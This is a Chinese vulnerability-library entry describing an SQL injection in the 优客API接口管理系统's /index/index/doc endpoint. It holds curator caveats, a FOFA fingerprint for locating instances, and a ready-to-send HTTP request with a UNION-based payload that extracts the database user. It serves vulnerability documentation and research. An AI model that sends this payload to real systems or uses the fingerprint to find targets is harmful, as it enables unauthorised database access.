---
source: "wy876 漏洞文库"
title: "优客API接口管理系统 index/index/doc id SQL注入"
product: "优客API接口管理系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "MySQL；固定14列UNION，版本未知"
prerequisites: "匿名请求示例"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/xphkgwr0lgod5047"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E4%BC%98%E5%AE%A2API%E6%8E%A5%E5%8F%A3%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E4%BC%98%E5%AE%A2API%E6%8E%A5%E5%8F%A3%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "plain"
id: "vw-ca1bfb20a2931b58656ae33e"
entity_id: "ve-ca1bfb20a2931b58656ae33e"
schema_version: "1"
---

# 优客API接口管理系统 index/index/doc id SQL注入

## 条目说明

- 对象与具体问题：优客API接口管理系统；index/index/doc id SQL注入
- 版本、配置及部署条件：MySQL；固定14列UNION，版本未知
- 认证与权限前提：匿名请求示例
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- FOFA元数据是代码语言plain，不是搜索语句，明确抽取污染
- UNION列数依赖查询结构，CURRENT_USER输出无实际响应，未证成功
- 大量API功能营销内容不替代发行方/版本；补源码/补丁
- 接口文档查询归开发管理类，不能与其他同名优客产品混合

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
优客API接口管理系统，内置30+API接口，支持服务器信息，网站ICP备案，抖音无水印，QQ在线状态QQ头像，获取历史上的今天，IP签名档，ICO站标获，随机动漫图，网站标题获取，爱站权重获取，城市天气获取，随机一言，皮皮虾无水印，每日Bing壁纸，垃圾分类，查询手机号归属地，申通快递查询等接口功能。优客API接口管理系统存在SQL注入漏洞

## 二、影响版本
+ 优客API接口管理系统

## 三、资产测绘
+ fofa

```plain
"public/static/index/css/flaghome.css"
```

+ 特征


## 四、漏洞复现
```http
POST /index/index/doc HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Connection: close

id=') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),NULL-- -
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xphkgwr0lgod5047>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
